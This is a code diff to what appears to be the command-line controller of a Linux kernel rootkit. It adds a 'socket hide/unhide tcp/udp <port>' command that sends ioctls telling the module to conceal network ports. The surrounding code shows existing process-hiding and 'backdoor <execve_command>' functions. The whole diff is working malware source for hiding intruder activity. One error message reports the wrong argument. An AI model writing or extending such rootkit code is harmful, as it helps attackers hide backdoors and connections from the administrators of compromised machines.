@@ -92,6 +92,32 @@ parse_input(int argc, char **argv)
     if (ARGVCMP(1, "hidepid-off"))
             return (cmd_t){ handle_pidhide, (void *)0 };
 
+    if (ARGVCMP(1, "socket")) {
+        ASSERT_ARGC(4, "socket <hide | unhide> <tcp | udp> <port>");
+
+        long arg;
+        if ((arg = strtol(argv[4], NULL, 10))) {
+            if (ARGVCMP(2, "hide")) {
+                if (ARGVCMP(3, "tcp"))
+                    return (cmd_t){ handle_tcphide, (void *)arg };
+
+                if (ARGVCMP(3, "udp"))
+                    return (cmd_t){ handle_udphide, (void *)arg };
+            }
+
+            if (ARGVCMP(2, "unhide")){
+                if (ARGVCMP(3, "tcp"))
+                    return (cmd_t){ handle_tcphide, (void *)((-1) * (arg)) };
+
+                if (ARGVCMP(3, "udp"))
+                    return (cmd_t){ handle_udphide, (void *)((-1) * (arg)) };
+            }
+        } else {
+            fprintf(stderr, "%s: invalid port `%s`\n", progname, argv[3]);
+            exit(1);
+        }
+    }
+
     if (ARGVCMP(1, "backdoor")) {
         ASSERT_ARGC(2, "backdoor <execve_command>");
         return (cmd_t){ handle_backdoor, (void *)argv[2] };
@@ -157,6 +183,18 @@ int
 handle_pidhide(void *arg)
 {
     return issue_ioctl(G7_PIDHIDE, (const char *)arg);
+}
+
+int
+handle_tcphide(void *arg)
+{
+    return issue_ioctl(G7_TCPHIDE, (const char *)arg);
+}
+
+int
+handle_udphide(void *arg)
+{
+    return issue_ioctl(G7_UDPHIDE, (const char *)arg);
 }
 
 int
